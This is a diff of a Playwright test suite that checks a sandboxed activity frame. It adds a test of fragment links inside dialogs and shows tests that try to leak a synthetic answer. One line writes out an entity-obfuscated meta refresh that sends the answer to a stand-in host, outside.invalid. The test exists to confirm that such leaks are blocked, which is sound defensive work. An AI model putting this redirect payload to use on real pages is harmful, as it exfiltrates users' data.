@@ -192,6 +192,27 @@ describe.each([["Chromium", chromium], ["WebKit", webkit]] as const)("published 
     } finally { await state.context.close(); }
   });
 
+  it("keeps a fragment link whose click a dialog stops inside the activity", async () => {
+    // A dialog commonly stops clicks reaching the overlay that closes it; a
+    // handler that also cancels the click still keeps the page where it is.
+    const state = await open(source.replace(
+      "<button",
+      '<div onclick="this.hidden = true"><div onclick="event.stopPropagation()"><a href="#end">Jump to end</a></div></div><div style="height:3000px"></div><p id="end">End</p><div onclick="this.hidden = true"><div onclick="event.stopPropagation(); return false"><a href="#">Stay</a></div></div><div style="height:3000px"></div><button',
+    ));
+    try {
+      const frame = activity(state.page);
+      await frame.getByRole("link", { name: "Jump to end" }).click();
+      await expect.poll(() => frame.evaluate("location.hash")).toBe("#end");
+      await expect.poll(() => frame.evaluate("scrollY")).toBeGreaterThan(0);
+      const scrolled = await frame.evaluate("scrollY");
+      await frame.getByRole("link", { name: "Stay" }).click();
+      await state.page.waitForTimeout(150);
+      expect(await activity(state.page).evaluate("[location.hash, scrollY]")).toEqual(["#end", scrolled]);
+      expect(await activity(state.page).locator("#answer").inputValue()).toBe("SYNTHETIC_ANSWER");
+      expect(state.external).toEqual([]);
+    } finally { await state.context.close(); }
+  });
+
   it.each(["location", "encoded refresh", "top location"])("contains %s without sending the answer outside", async (payload) => {
     const html = payload === "encoded refresh"
       ? source.replace("</head>", '<meta http-equiv="&#114;efresh" content="0;url=https://outside.invalid/collect?answer=SYNTHETIC_ANSWER"></head>')
